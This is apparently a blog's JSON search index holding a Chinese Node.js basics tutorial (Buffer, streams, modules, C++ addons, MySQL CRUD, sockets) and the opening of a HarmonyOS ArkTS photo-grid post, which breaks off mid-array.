Buffer.from(\u0026#39;test\u0026#39;, \u0026#39;ascii\u0026#39;); // 输出 72756e6f6f62 console.log(buf.toString(\u0026#39;hex\u0026#39;)); // 输出 cnVub29i console.log(buf.toString(\u0026#39;base64\u0026#39;)); //UTF-8 console.log(buf.toString(\u0026#39;UTF-8\u0026#39;)); //ascii console.log(buf.toString(\u0026#39;ascii\u0026#39;)); //utf16le console.log(buf.toString(\u0026#39;utf16le\u0026#39;)); //latin1 console.log(buf.toString(\u0026#39;latin1\u0026#39;)); Node.js 目前支持的字符编码包括：\nascii - 仅支持 7 位 ASCII 数据。如果设置去掉高位的话，这种编码是非常快的。\nutf8 - 多字节编码的 Unicode 字符。许多网页和其他文档格式都使用 UTF-8 。\nutf16le - 2 或 4 个字节，小字节序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。\nucs2 - utf16le 的别名。\nbase64 - Base64 编码。\nlatin1 - 一种把 Buffer 编码成一字节编码的字符串的方式。\nbinary - latin1 的别名。\nhex - 将每个字节编码为两个十六进制字符。\n创建 Buffer 类 Buffer 提供了以下 API 来创建 Buffer 类：\nBuffer.alloc(size[, fill[, encoding]])： 返回一个指定大小的 Buffer 实例，如果没有设置 fill，则默认填满 0 Buffer.allocUnsafe(size)： 返回一个指定大小的 Buffer 实例，但是它不会被初始化，所以它可能包含敏感的数据 Buffer.allocUnsafeSlow(size) Buffer.from(array)： 返回一个被 array 的值初始化的新的 Buffer 实例（传入的 array 的元素只能是数字，不然就会自动被 0 覆盖） Buffer.from(arrayBuffer[, byteOffset[, length]])： 返回一个新建的与给定的 ArrayBuffer 共享同一内存的 Buffer。 Buffer.from(buffer)： 复制传入的 Buffer 实例的数据，并返回一个新的 Buffer 实例 Buffer.from(string[, encoding])： 返回一个被 string 的值初始化的新的 Buffer 实例\n写入缓冲区 语法 写入 Node 缓冲区的语法如下所示：\nbuf.write(string[, offset[, length]][, encoding]) 参数 参数描述如下：\nstring - 写入缓冲区的字符串。\noffset - 缓冲区开始写入的索引值，默认为 0 。\nlength - 写入的字节数，默认为 buffer.length\nencoding - 使用的编码。默认为 \u0026lsquo;utf8\u0026rsquo; 。\n根据 encoding 的字符编码写入 string 到 buf 中的 offset 位置。 length 参数是写入的字节数。 如果 buf 没有足够的空间保存整个字符串，则只会写入 string 的一部分。 只部分解码的字符不会被写入。\n返回值 返回实际写入的大小。如果 buffer 空间不足， 则只会写入部分字符串。\n实例\nbuf = Buffer.alloc(256); len = buf.write(\u0026#34;123123\u0026#34;); console.log(\u0026#34;写入字节数 : \u0026#34;+ len); 从缓冲区读取数据 语法 读取 Node 缓冲区数据的语法如下所示：\nbuf.toString([encoding[, start[, end]]]) 参数 参数描述如下：\nencoding - 使用的编码。默认为 \u0026lsquo;utf8\u0026rsquo; 。\nstart - 指定开始读取的索引位置，默认为 0。\nend - 结束位置，默认为缓冲区的末尾。\n返回值 解码缓冲区数据并使用指定的编码返回字符串。\n实例\nbuf = Buffer.alloc(26); for (var i = 0 ; i \u0026lt; 26 ; i++) { buf[i] = i + 97; } console.log( buf.toString(\u0026#39;ascii\u0026#39;)); // 输出: abcdefghijklmnopqrstuvwxyz console.log( buf.toString(\u0026#39;ascii\u0026#39;,0,5)); //使用 \u0026#39;ascii\u0026#39; 编码, 并输出: abcde console.log( buf.toString(\u0026#39;utf8\u0026#39;,0,5)); // 使用 \u0026#39;utf8\u0026#39; 编码, 并输出: abcde console.log( buf.toString(undefined,0,5)); // 使用默认的 \u0026#39;utf8\u0026#39; 编码, 并输出: abcde 将 Buffer 转换为 JSON 对象 语法 将 Node Buffer 转换为 JSON 对象的函数语法格式如下：\nbuf.toJSON() const buf = Buffer.from([0x1, 0x2, 0x3, 0x4, 0x5]); const json = JSON.stringify(buf); // 输出: {\u0026#34;type\u0026#34;:\u0026#34;Buffer\u0026#34;,\u0026#34;data\u0026#34;:[1,2,3,4,5]} console.log(json); const copy = JSON.parse(json, (key, value) =\u0026gt; { return value \u0026amp;\u0026amp; value.type === \u0026#39;Buffer\u0026#39; ? Buffer.from(value.data) : value; }); // 输出: \u0026lt;Buffer 01 02 03 04 05\u0026gt; console.log(copy); 缓冲区合并 语法 Node 缓冲区合并的语法如下所示：\nBuffer.concat(list[, totalLength]) var buffer1 = Buffer.from((\u0026#39;123\u0026#39;)); var buffer2 = Buffer.from((\u0026#39;test\u0026#39;)); var buffer3 = Buffer.concat([buffer1,buffer2]); console.log(\u0026#34;buffer3 内容: \u0026#34; + buffer3.toString()); 缓冲区比较 语法 Node Buffer 比较的函数语法如下所示, 该方法在 Node.js v0.12.2 版本引入：\nbuf.compare(otherBuffer); var buffer1 = Buffer.from(\u0026#39;ABC\u0026#39;); var buffer2 = Buffer.from(\u0026#39;ABCD\u0026#39;); var result = buffer1.compare(buffer2); if(result \u0026lt; 0) { console.log(buffer1 + \u0026#34; 在 \u0026#34; + buffer2 + \u0026#34;之前\u0026#34;); }else if(result == 0){ console.log(buffer1 + \u0026#34; 与 \u0026#34; + buffer2 + \u0026#34;相同\u0026#34;); }else { console.log(buffer1 + \u0026#34; 在 \u0026#34; + buffer2 + \u0026#34;之后\u0026#34;); } 拷贝缓冲区 语法 Node 缓冲区拷贝语法如下所示：\nbuf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]]) var buf1 = Buffer.from(\u0026#39;abcdefghijkl\u0026#39;); var buf2 = Buffer.from(\u0026#39;123\u0026#39;); //将 buf2 插入到 buf1 指定位置上 buf2.copy(buf1, 2); console.log(buf1.toString()); 缓冲区裁剪 Node 缓冲区裁剪语法如下所示：\nbuf.slice([start[, end]]) var buffer1 = Buffer.from(\u0026#39;TEST123TEST\u0026#39;); // 剪切缓冲区 var buffer2 = buffer1.slice(0,2); console.log(\u0026#34;buffer2 content: \u0026#34; + buffer2.toString()); 缓冲区长度 语法 Node 缓冲区长度计算语法如下所示：\nbuf.length; var buffer = Buffer.from(\u0026#39;123123123\u0026#39;); // 缓冲区长度 console.log(\u0026#34;buffer length: \u0026#34; + buffer.length); 👨‍💻Node.js Stream Node.js Stream(流)\nStream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对http 服务器发起请求的request 对象就是一个 Stream，还有stdout（标准输出）。\nNode.js，Stream 有四种流类型：\nReadable - 可读操作。\nWritable - 可写操作。\nDuplex - 可读可写操作.\nTransform - 操作被写入数据，然后读出结果。\n所有的 Stream 对象都是 EventEmitter 的实例。常用的事件有：\ndata - 当有数据可读时触发。\nend - 没有更多的数据可读时触发。\nerror - 在接收和写入过程中发生错误时触发。\nfinish - 所有数据已被写入到底层系统时触发。\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#39;\u0026#39;; // 创建可读流 var readerStream = fs.createReadStream(\u0026#39;x.txt\u0026#39;); // 设置编码为 utf8。 readerStream.setEncoding(\u0026#39;UTF8\u0026#39;); // 处理流事件 --\u0026gt; data, end, and error readerStream.on(\u0026#39;data\u0026#39;, function(chunk) { data += chunk; }); readerStream.on(\u0026#39;end\u0026#39;,function(){ console.log(data); }); readerStream.on(\u0026#39;error\u0026#39;, function(err){ console.log(err.stack); }); console.log(\u0026#34;程序执行完毕\u0026#34;); 写入流\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#39;\u0026#39;; var dataw = \u0026#39;w123w\u0026#39;; var ws = fs.createWriteStream(\u0026#39;x.txt\u0026#39;); ws.write(dataw); ws.end(); console.log(\u0026#34;数据写入成功！\u0026#34;); 管道流 管道提供了一个输出流到输入流的机制。通常我们用于从一个流中获取数据并将数据传递到另外一个流中。\nvar fs = require(\u0026#34;fs\u0026#34;); // 创建一个可读流 var readerStream = fs.createReadStream(\u0026#39;x.txt\u0026#39;); // 创建一个可写流 var writerStream = fs.createWriteStream(\u0026#39;output.txt\u0026#39;); // 管道读写操作 // 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中 readerStream.pipe(writerStream); console.log(\u0026#34;程序执行完毕\u0026#34;); 链式流 链式是通过连接输出流到另外一个流并创建多个流操作链的机制。链式流一般用于管道操作。\n接下来我们就是用管道和链式来压缩和解压文件。\nvar fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;); // 压缩 input.txt 文件为 input.txt.gz fs.createReadStream(\u0026#39;x.txt\u0026#39;) .pipe(zlib.createGzip()) .pipe(fs.createWriteStream(\u0026#39;input.txt.gz\u0026#39;)); console.log(\u0026#34;文件压缩完成。\u0026#34;); var fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;); // 解压 input.txt.gz 文件为 input.txt fs.createReadStream(\u0026#39;input.txt.gz\u0026#39;) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(\u0026#39;input2.txt\u0026#39;)); console.log(\u0026#34;文件解压完成。\u0026#34;); 📝Node.js 模块系统 ~~\n为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。\n模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C/C++ 扩展。\n//hello.js exports.world1 = function() { console.log(\u0026#34;hello world node.js \u0026#34;) } //test.js var hello = require(\u0026#39;./hello\u0026#39;); hello.world1(); hello.js 通过 exports 对象把 world1 作为模块的访问接口，在 main.js 中通过 require(\u0026rsquo;./hello\u0026rsquo;) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。\n//hello.js function Hello() { var name; this.setName = function(thyName) { name = thyName; }; this.sayHello = function() { console.log(\u0026#39;Hello \u0026#39; + name); }; }; module.exports = Hello; //test.js var Hello = require(\u0026#39;./hello\u0026#39;); hello = new Hello(); hello.setName(\u0026#39;vvv\u0026#39;); hello.sayHello(); 模块接口的唯一变化是使用 module.exports = Hello 代替了exports.world = function(){}。 在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的 exports。\nexports 和 module.exports 的使用\n如果要对外暴露属性或方法，就用 exports 就行，要暴露对象(类似class，包含了很多属性和方法)，就用 module.exports。\nPS 模块加载 从文件模块缓存中加载 尽管原生模块与文件模块的优先级不同，但是都会优先从文件模块的缓存中加载已经存在的模块。\n从原生模块加载 原生模块的优先级仅次于文件模块缓存的优先级。require 方法在解析文件名之后，优先检查模块是否在原生模块列表中。以http模块为例，尽管在目录下存在一个 http/http.js/http.node/http.json 文件，require(\u0026ldquo;http\u0026rdquo;) 都不会从这些文件中加载，而是从原生模块中加载。\n原生模块也有一个缓存区，同样也是优先从缓存区加载。如果缓存区没有被加载过，则调用原生模块的加载方式进行加载和执行。\n从文件加载 当文件模块缓存中不存在，而且不是原生模块的时候，Node.js 会解析 require 方法传入的参数，并从文件系统中加载实际的文件，加载过程中的包装和编译细节在前一节中已经介绍过，这里我们将详细描述查找文件模块的过程，其中，也有一些细节值得知晓。\nrequire方法接受以下几种参数的传递：\nhttp、fs、path等，原生模块。 ./mod或../mod，相对路径的文件模块。 /pathtomodule/mod，绝对路径的文件模块。 mod，非原生模块的文件模块。\n🔄nodejs 加载c++ 在Node.js中加载C++代码，通常是通过编写一个C++的扩展模块，然后通过Node.js的require方法加载这个模块。这可以通过Node.js的原生扩展模块API实现，也可以通过N-API实现，这是一个为构建可以在多个Node.js版本上工作的原生扩展模块而设计的API。\n以下是一个简单的例子，展示如何创建一个C++扩展模块并在Node.js中使用它。\n首先，你需要安装一个名为node-gyp的工具，这是一个用来编译C++扩展模块的工具：\nnpm install -g node-gyp 然后，创建一个名为binding.gyp的文件，它描述了如何构建扩展模块：\n{ \u0026#34;targets\u0026#34;: [ { \u0026#34;target_name\u0026#34;: \u0026#34;addon\u0026#34;, \u0026#34;sources\u0026#34;: [ \u0026#34;addon.cc\u0026#34; ] } ] } 接下来，创建一个C++源文件，例如addon.cc，它包含了你的C++代码：\n#include \u0026lt;node.h\u0026gt; namespace demo { using v8::FunctionCallbackInfo; using v8::Isolate; using v8::Local; using v8::NewStringType; using v8::Object; using v8::String; using v8::Value; void Method(const FunctionCallbackInfo\u0026lt;Value\u0026gt;\u0026amp; args) { Isolate* isolate = args.GetIsolate(); args.GetReturnValue().Set(String::NewFromUtf8(isolate, \u0026#34;world\u0026#34;, NewStringType::kNormal).ToLocalChecked()); } void Initialize(Local\u0026lt;Object\u0026gt; exports) { NODE_SET_METHOD(exports, \u0026#34;hello\u0026#34;, Method); } NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize) } // namespace demo 确保在binding.gyp文件的同一目录下，运行以下命令来构建扩展模块：\nnode-gyp configure build 这将生成一个编译好的扩展模块，你可以在Node.js中通过require来加载并使用它：\nconst addon = require(\u0026#39;./build/Release/addon.node\u0026#39;); console.log(addon.hello()); // 输出: world 在这个例子中，C++模块导出了一个名为hello的方法，当在Node.js中调用这个方法时，它返回字符串\u0026quot;world\u0026quot;。\n🙋‍♀️Node.js 函数 在 JavaScript中，一个函数可以作为另一个函数的参数。我们可以先定义一个函数，然后传递，也可以在传递参数的地方直接定义函数。\nNode.js 中函数的使用与 JavaScript 类似，举例来说，你可以这样做：\nfunction say(word) { console.log(word); } function execute(someFunction, value) { someFunction(value); } execute(say, \u0026#34;Hello\u0026#34;); 以上代码中，我们把 say 函数作为 execute 函数的第一个变量进行了传递。这里传递的不是 say 的返回值，而是 say 本身！\n这样一来， say 就变成了execute 中的本地变量 someFunction ，execute 可以通过调用 someFunction() （带括号的形式）来使用 say 函数。\n当然，因为 say 有一个变量， execute 在调用 someFunction 时可以传递这样一个变量。\n匿名函数 function execute(someFunction, value) { someFunction(value); } execute(function(word){ console.log(word) }, \u0026#34;Hello\u0026#34;); 传递\nvar http = require(\u0026#34;http\u0026#34;); function onRequest(request, response) { response.writeHead(200, {\u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34;}); response.write(\u0026#34;Hello World\u0026#34;); response.end(); } http.createServer(onRequest).listen(8888); ==\u0026gt;\nvar http = require(\u0026#34;http\u0026#34;); http.createServer(function(request, response) { response.writeHead(200, {\u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34;}); response.write(\u0026#34;Hello World\u0026#34;); response.end(); }).listen(8888); 🙋‍♂Node.js 箭头函数 在Node.js中，箭头函数是一种简洁写法，用于声明匿名函数。它们最常用于回调函数和事件监听器等场景。箭头函数的语法很简单，它的基本格式如下：\n(param1, param2, ...) =\u0026gt; { // 函数体 return something; } const numbers = [1, 2, 3, 4, 5]; const doubled = numbers.map(number =\u0026gt; number * 2); console.log(doubled); // 输出: [2, 4, 6, 8, 10] setTimeout(() =\u0026gt; { console.log(\u0026#39;hihihi.\u0026#39;); }, 2000); 以上决策图看起来有点复杂，我认为有三点比较重要：\n箭头函数适合于无复杂逻辑或者无副作用的纯函数场景下，例如用在 map 、 reduce 、 filter 的回调函数定义中； 不要在最外层定义箭头函数，因为在函数内部操作 this 会很容易污染全局作用域。最起码在箭头函数外部包一层普通函数，将 this 控制在可见的范围内； 如开头所述，箭头函数最吸引人的地方是简洁。在有多层函数嵌套的情况下，箭头函数的简洁性并没有很大的提升，反而影响了函数的作用范围的识别度，这种情况不建议使用箭头函数。\n🧪Node.js 路由 在 Node.js 中，路由（Routing）是指确定如何响应对特定端点（URL 路径）的 HTTP 请求的过程。\n我们要为路由提供请求的 URL 和其他需要的 GET 及 POST 参数，随后路由需要根据这些数据来执行相应的代码。\n因此，我们需要查看 HTTP 请求，从中提取出请求的 URL 以及 GET/POST 参数。这一功能应当属于路由还是服务器（甚至作为一个模块自身的功能）确实值得探讨，但这里暂定其为我们的HTTP服务器的功能。\n我们需要的所有数据都会包含在 request 对象中，该对象作为 onRequest() 回调函数的第一个参数传递。但是为了解析这些数据，我们需要额外的 Node.JS 模块，它们分别是 url 和 querystring 模块。\nurl.parse(string).query | url.parse(string).pathname | | | | | ++++++ ++++++++++++++++++- http://localhost:8888/start?foo=bar\u0026amp;hello=world +++ +++\u0026ndash; | | | | querystring.parse(queryString)[\u0026ldquo;foo\u0026rdquo;] | | querystring.parse(queryString)[\u0026ldquo;hello\u0026rdquo;] 现在我们来给 onRequest() 函数加上一些逻辑，用来找出浏览器请求的 URL 路径：\nrouter.js\nfunction route(pathname) { console.log(\u0026#34;About to route a request for \u0026#34; + pathname); } exports.route = route; server.js\nvar http = require(\u0026#34;http\u0026#34;); var url = require(\u0026#34;url\u0026#34;); function start(route) { function onRequest(request, response) { var pathname = url.parse(request.url).pathname; console.log(\u0026#34;Request for \u0026#34; + pathname + \u0026#34; received.\u0026#34;); route(pathname); response.writeHead(200, {\u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34;}); response.write(\u0026#34;Hello World\u0026#34;); response.end(); } http.createServer(onRequest).listen(8888); console.log(\u0026#34;Server has started.\u0026#34;); } exports.start = start; //test.js var server = require(\u0026#34;./server\u0026#34;); var router = require(\u0026#34;./router\u0026#34;); server.start(router.route); node test.js 🙏Node.js 全局对象 javaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即全局变量。\n在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是 global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。\n在 Node.js 我们可以直接访问到 global 的属性，而不需要在应用中包含它。\n全局对象与全局变量 global 最根本的作用是作为全局变量的宿主。按照 ECMAScript 的定义，满足以下条 件的变量是全局变量：\n在最外层定义的变量； 全局对象的属性； 隐式定义的变量（未定义直接赋值的变量）。 当你定义一个全局变量时，这个变量同时也会成为全局对象的属性，反之亦然。需要注 意的是，在 Node.js 中你不可能在最外层定义变量，因为所有用户代码都是属于当前模块的， 而模块本身不是最外层上下文。\n注意： 最好不要使用 var 定义变量以避免引入全局变量，因为全局变量会污染命名空间，提高代码的耦合风险。\n__filename __filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。\n__dirname __dirname 表示当前执行脚本所在的目录。\nsetTimeout(cb, ms) setTimeout(cb, ms) 全局函数在指定的毫秒(ms)数后执行指定函数(cb)。：setTimeout() 只执行一次指定函数。\nclearTimeout(t) clearTimeout( t ) 全局函数用于停止一个之前通过 setTimeout() 创建的定时器。 参数 t 是通过 setTimeout() 函数创建的定时器。\nfunction printHello(){ console.log( \u0026#34;Hello, World!\u0026#34;); } // 两秒后执行以上函数 var t = setTimeout(printHello, 2000); // 清除定时器 clearTimeout(t); 执行 main.js 文件，代码如下所示:\nsetInterval(cb, ms) setInterval(cb, ms) 全局函数在指定的毫秒(ms)数后执行指定函数(cb)。\n返回一个代表定时器的句柄值。可以使用 clearInterval(t) 函数来清除定时器。\nsetInterval() 方法会不停地调用函数，直到 clearInterval() 被调用或窗口被关闭。\nfunction printHello(){ console.log( \u0026#34;Hello, World!\u0026#34;); } // 两秒后执行以上函数 setInterval(printHello, 2000); console console 用于提供控制台标准输出，它是由 Internet Explorer 的 JScript 引擎提供的调试工具，后来逐渐成为浏览器的实施标准。\nconsole.log console.info console.error console.warn console.time(label) 输出时间，表示计时开始。 console.timeEnd(label) 结束时间，表示计时结束。 console.trace\nconsole.info(\u0026#34;程序开始执行：\u0026#34;); var counter = 10; console.log(\u0026#34;计数: %d\u0026#34;, counter); console.time(\u0026#34;获取数据\u0026#34;); // for(var i = 0; i \u0026lt; 100000; i++ ) {} // console.timeEnd(\u0026#39;获取数据\u0026#39;); console.info(\u0026#34;程序执行完毕。\u0026#34;) process process 是一个全局变量，即 global 对象的属性。\nprocess.on(\u0026#39;exit\u0026#39;, function(code) { // 以下代码永远不会执行 setTimeout(function() { console.log(\u0026#34;该代码不会执行\u0026#34;); }, 0); console.log(\u0026#39;退出码为:\u0026#39;, code); }); console.log(\u0026#34;程序执行结束\u0026#34;); Process 属性 Process 提供了很多有用的属性，便于我们更好的控制系统的交互\nstdout 标准输出流 stderr 标准错误流。 stdin 标准输入流。 argv argv 属性返回一个数组，由命令行执行脚本时的各个参数组成。它的第一个成员总是node，第二个成员是脚本文件名，其余成员是脚本文件的参数。 execPath 返回执行当前脚本的 Node 二进制文件的绝对路径。 execArgv 返回一个数组，成员是命令行下执行脚本时，在Node可执行文件与脚本文件之间的命令行参数。 env 返回一个对象，成员为当前 shell 的环境变量 exitCode 进程退出时的代码，如果进程优通过 process.exit() 退出，不需要指定退出码。 version Node 的版本，比如v0.10.18 config 一个包含用来编译当前 node 执行文件的 javascript 配置选项的对象。它与运行 ./configure 脚本生成的 \u0026ldquo;config.gypi\u0026rdquo; 文件相同。 pid 当前进程的进程号。 title 进程名，默认值为\u0026quot;node\u0026quot;，可以自定义该值。 platform 运行程序所在的平台系统 \u0026lsquo;darwin\u0026rsquo;, \u0026lsquo;freebsd\u0026rsquo;, \u0026rsquo;linux\u0026rsquo;, \u0026lsquo;sunos\u0026rsquo; 或 \u0026lsquo;win32\u0026rsquo; arch 当前 CPU 的架构：\u0026lsquo;arm\u0026rsquo;、\u0026lsquo;ia32\u0026rsquo; 或者 \u0026lsquo;x64\u0026rsquo;。 mainModule require.main 的备选方法。不同点，如果主模块在运行时改变，require.main可能会继续返回老的模块。可以认为，这两者引用了同一个模块。\n// 输出到终端 process.stdout.write(\u0026#34;Hello World!\u0026#34; + \u0026#34;\\n\u0026#34;); // 通过参数读取 process.argv.forEach(function(val, index, array) { console.log(index + \u0026#39;: \u0026#39; + val); }); // 获取执行路径 console.log(process.execPath); // 平台信息 console.log(process.platform); // 输出当前目录 console.log(\u0026#39;当前目录: \u0026#39; + process.cwd()); // 输出当前版本 console.log(\u0026#39;当前版本: \u0026#39; + process.version); // 输出内存使用情况 console.log(process.memoryUsage()); 🔭Node.js MySQL npm install mysql select\nvar mysql = require(\u0026#39;mysql\u0026#39;); var connection = mysql.createConnection({ host : \u0026#39;localhost\u0026#39;, user : \u0026#39;root\u0026#39;, password : \u0026#39;123456789\u0026#39;, //pwd port: \u0026#39;30306\u0026#39;, database: \u0026#39;IMDB\u0026#39; }); connection.connect(); var sql = \u0026#39;SELECT * FROM IMConfig;\u0026#39;; console.log(sql); //查 connection.query(sql,function (err, result) { if(err){ console.log(\u0026#39;[SELECT ERROR] - \u0026#39;,err.message); return; } console.log(\u0026#39;++++++++++++++++++++++++--SELECT+++++++++++++++++++++++++++-\u0026#39;); console.log(result); console.log(\u0026#39;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\\n\u0026#39;); }); connection.end(); ERROR 1045 (28000): Access denied for user ‘root‘@‘localhost‘ (using password: YES) 这边是通过docker安装的mysql，登录报错 root@f4a3881e5f06:/# mysql -uroot -p Enter password: 123456 ERROR 1045 (28000): Access denied for user \u0026lsquo;root\u0026rsquo;@\u0026rsquo;localhost\u0026rsquo; (using password: YES)\n如果常规的命令 mysql -uroot -p无法登录，使用命令尝试：\nmysql -u root -h 127.0.0.1 -p\nError: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested mysql -u root -p ALTER USER \u0026lsquo;root\u0026rsquo;@\u0026rsquo;%\u0026rsquo; IDENTIFIED WITH mysql_native_password BY \u0026lsquo;123456789\u0026rsquo;; flush privileges;\ninsert\nconnection.connect(); var addSql = \u0026#39;INSERT INTO IMConfig(ConfigID,UserID,ConfigName,ConfigCreateTime,ConfigType,ConfigSn) VALUES(0,?,?,?,?,?)\u0026#39;; var addSqlParams = [\u0026#39;1\u0026#39;, \u0026#39;11\u0026#39;,\u0026#39;2023-01-01\u0026#39;, \u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;]; //增 connection.query(addSql,addSqlParams,function (err, result) { if(err){ console.log(\u0026#39;[INSERT ERROR] - \u0026#39;,err.message); return; } console.log(\u0026#39;++++++++++++++++++++++++--INSERT+++++++++++++++++++++++++++-\u0026#39;); //console.log(\u0026#39;INSERT ID:\u0026#39;,result.insertId); console.log(\u0026#39;INSERT ID:\u0026#39;,result); console.log(\u0026#39;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--\\n\\n\u0026#39;); }); connection.end(); ER_NO_SUCH_TABLE: Table \u0026lsquo;IMDB.IMCONFIG\u0026rsquo; doesn\u0026rsquo;t exist 中英文错误 ER_WRONG_VALUE_COUNT_ON_ROW: Column count doesn\u0026rsquo;t match value count at row 1 字段错误 ER_TRUNCATED_WRONG_VALUE: Incorrect datetime value: \u0026lsquo;2023-01-01T16:00:00.000Z\u0026rsquo; for column \u0026lsquo;ConfigCreateTime\u0026rsquo; at row 1 字段类型\nupdate\n//update connection.connect(); var modSql = \u0026#39;UPDATE IMConfig SET ConfigName = ?,ConfigType = ?,ConfigSn = ? WHERE ConfigId = ?\u0026#39;; var modSqlParams = [\u0026#39;lang\u0026#39;, \u0026#39;2\u0026#39;,\u0026#39;1\u0026#39;,5]; //改 connection.query(modSql,modSqlParams,function (err, result) { if(err){ console.log(\u0026#39;[UPDATE ERROR] - \u0026#39;,err.message); return; } console.log(\u0026#39;++++++++++++++++++++++++--UPDATE+++++++++++++++++++++++++++-\u0026#39;); console.log(\u0026#39;UPDATE affectedRows\u0026#39;,result.affectedRows); console.log(\u0026#39;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--\\n\\n\u0026#39;); }); connection.end(); delete\nconnection.connect(); var delSql = \u0026#39;DELETE FROM IMConfig where ConfigID=5\u0026#39;; //删 connection.query(delSql,function (err, result) { if(err){ console.log(\u0026#39;[DELETE ERROR] - \u0026#39;,err.message); return; } console.log(\u0026#39;++++++++++++++++++++++++--DELETE+++++++++++++++++++++++++++-\u0026#39;); console.log(\u0026#39;DELETE affectedRows\u0026#39;,result.affectedRows); console.log(\u0026#39;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++--\\n\\n\u0026#39;); }); connection.end(); 🧵Node.js Socket socket client\n//sk var net = require(\u0026#39;net\u0026#39;); var client = net.connect(\u0026#39;6001\u0026#39;, \u0026#39;xxxx\u0026#39;, function(){ console.log(\u0026#39;已经与服务器连接\u0026#39;); client.write(\u0026#39;Yes\\r\\n\u0026#39;); }); client.on(\u0026#39;data\u0026#39;, function(data){ console.log(data.toString()); client.end();//one msg end }); client.on(\u0026#39;end\u0026#39;, function(){ console.log(\u0026#39;客户端连接中断\u0026#39;); }); ","permalink":"https://qfsyso.github.io/posts/nodejs-base/","summary":"简单的说 Node.js 就是运行在服务端的 JavaScript。\nNode.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。\nNode.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。\n🛠Node.js安装 Node.js安装在上一篇文章Debian Node.js HEXO 有讲到\n截至目前最新的版本是20.12.2\n#查看版本 node -v v20.12.2\nwin下可以在官网下载安装 https://nodejs.org/en/download\ndebian nodejs node 14版本\n$ apt-get update $ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash - #如果提示sudo 命令没有找到，一定要下载，执行apt-get install sudo -y 即可，然后再执行上述命令\n$ apt-get install nodejs -y $ node --version //验证 当然如果需要安装node20版本，只需将上述命令替换为：\n$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 💬helloworld hi.","title":"Nodejs base"},{"content":"​\n✨️index title swiper list(grid)\nimport coms from \u0026#39;../pages/com\u0026#39; @Entry @Component struct Index { @State message: string = \u0026#39;Hello World1\u0026#39; //private list = new con build() { Column() { //标题 Row(){ Text(\u0026#39;photos\u0026#39;) .fontSize(\u0026#39;30fp\u0026#39;) .fontWeight(FontWeight.Bold) } .justifyContent(FlexAlign.Start) .width(\u0026#39;100%\u0026#39;) .padding(\u0026#39;12vp\u0026#39;) //轮播 Swiper() { ForEach(coms.SWIPERLIST,(item:Resource,index?:Number)=\u0026gt;{ Row() { Image(item) } .width(\u0026#39;100%\u0026#39;) .aspectRatio(1.6) }) } .autoPlay(true) .loop(true) .indicator(true) .duration(1000) .itemSpace(10) .borderRadius(\u0026#39;12vp\u0026#39;) .margin(\u0026#39;12vp\u0026#39;) .onChange((index: number) =\u0026gt; { }) //列表 Grid(){ GridItem(){ Column(){ Image($r(\u0026#39;app.media.icon\u0026#39;)) .borderRadius(2) } } GridItem(){ Column(){ Image($r(\u0026#39;app.media.icon\u0026#39;)) .borderRadius(2) } } GridItem(){ Column(){ Image($r(\u0026#39;app.media.icon\u0026#39;)) .borderRadius(2) } } GridItem(){ Column(){ Image($r(\u0026#39;app.media.44\u0026#39;)) .borderRadius(2) } } } .columnsTemplate(\u0026#39;1fr 1fr\u0026#39;) .columnsGap(\u0026#39;12vp\u0026#39;) .rowsGap(\u0026#39;12vp\u0026#39;) //.padding(\u0026#39;2vp\u0026#39;) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) } } 核心Grid的\n.columnsTemplate(\u0026#39;1fr 1fr \u0026#39;) 轮播数据 合并data data\nexport default class com{ static SWIPERLIST:Array\u0026lt;Resource\u0026gt;=[ $r(\u0026#39;app.media.11\u0026#39;), $r(\u0026#39;app.media.22\u0026#39;), $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.44\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;) ] } 列表数据\nstatic IMGLIST :Resource[][]=[ [ $r(\u0026#39;app.media.11\u0026#39;), $r(\u0026#39;app.media.22\u0026#39;), $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.44\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;)], [ $r(\u0026#39;app.media.22\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;), $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.44\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;)] , [ $r(\u0026#39;app.media.44\u0026#39;), 